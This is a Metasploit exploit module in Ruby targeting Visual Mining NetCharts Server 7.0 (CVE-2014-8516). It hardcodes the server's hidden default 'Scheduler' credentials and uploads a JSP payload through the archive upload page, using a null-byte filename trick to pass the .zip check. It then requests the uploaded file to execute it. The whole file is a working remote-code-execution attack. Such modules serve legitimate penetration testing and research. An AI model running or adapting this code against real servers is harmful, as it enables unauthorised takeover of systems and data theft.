# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  DEFAULT_USERNAME = &#039;Scheduler&#039;
  DEFAULT_PASSWORD = &#039;!@#$scheduler$#@!&#039;
  SIGNATURE = &#039;was uploaded successfully and is now ready for installation&#039;

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Visual Mining NetCharts Server Remote Code Execution&#039;,
      &#039;Description&#039; => %q{
        This module exploits multiple vulnerabilities in Visual Mining NetCharts.
        First, a lack of input validation in the administration console permits
        arbitrary jsp code upload to locations accessible later through the web
        service. Authentication is typically required, however a &#039;hidden&#039; user is
        available by default (and non editable). This user, named &#039;Scheduler&#039;,
        can only login to the console after any modification in the user
        database (a user is added, admin password is changed etc). If the
        &#039;Scheduler&#039; user isn&#039;t available valid credentials must be supplied. The
        default Admin password is Admin.
      },
      &#039;Author&#039;       =>
        [
          &#039;sghctoma&#039;,    # Vulnerability Discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2014-8516&#039;],
          [&#039;ZDI&#039;, &#039;14-372&#039;]
        ],
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => %w{ linux win },
      &#039;Arch&#039;        => ARCH_JAVA,
      &#039;Targets&#039;     =>
        [
          [&#039;Visual Mining NetCharts Server 7.0&#039;, {}]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 03 2014&#039;))

    register_options(
      [
        Opt::RPORT(8001),
        OptString.new(&#039;USERNAME&#039;, [false, "The username to authenticate with"]),
        OptString.new(&#039;PASSWORD&#039;, [false, "The password to authenticate with"])
      ], self.class)
  end

  def check
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(&#039;/&#039;, &#039;Admin&#039;, &#039;archive&#039;, &#039;upload.jsp&#039;),
      &#039;vars_get&#039; => { &#039;mode&#039; => &#039;getZip&#039; },
      &#039;authorization&#039; => basic_auth(username, password)
    })

    if res && res.code == 200 && res.body && res.body.to_s.include?(SIGNATURE)
      Exploit::CheckCode::Detected
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    jsp_payload = "#{rand_text_alphanumeric(4 + rand(32-4))}.jsp"
    print_status("#{peer} - Uploading JSP payload #{jsp_payload}...")
    if upload(jsp_payload, payload.encoded)
      print_good("#{peer} - JSP payload uploaded successfully")
      register_file_for_cleanup("./webapps/Admin/archive/ArchiveCache/#{jsp_payload}")
    else
      fail_with(Failure::Unknown, "#{peer} - JSP payload upload failed")
    end

    print_status("#{peer} - Executing payload...")
    execute(jsp_payload, 1)
  end

  def execute(jsp_name, time_out = 20)
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(&#039;/&#039;, &#039;Admin&#039;, &#039;archive&#039;, &#039;ArchiveCache&#039;, jsp_name),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;authorization&#039; => basic_auth(username, password)
    }, time_out)

    res
  end

  def upload(file_name, contents)
    post_data = Rex::MIME::Message.new
    post_data.add_part(
      contents,
      &#039;application/octet-stream&#039;,
      nil,
      "form-data; name=\"FILE1\"; filename=\"#{file_name}\x00Archive0101140101.zip\""
    )

    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri("/", &#039;Admin&#039;, &#039;archive&#039;, &#039;upload.jsp&#039;),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;data&#039;   => post_data.to_s,
      &#039;vars_get&#039; => { &#039;mode&#039; => &#039;getZip&#039; },
      &#039;authorization&#039; => basic_auth(username, password)
    })

    if res && res.code == 200 && res.body && res.body.to_s.include?(SIGNATURE)
      true
    else
      false
    end
  end

  def username
    datastore[&#039;USERNAME&#039;].blank? ? DEFAULT_USERNAME : datastore[&#039;USERNAME&#039;]
  end

  def password
    datastore[&#039;PASSWORD&#039;].blank? ? DEFAULT_PASSWORD : datastore[&#039;PASSWORD&#039;]
  end
end

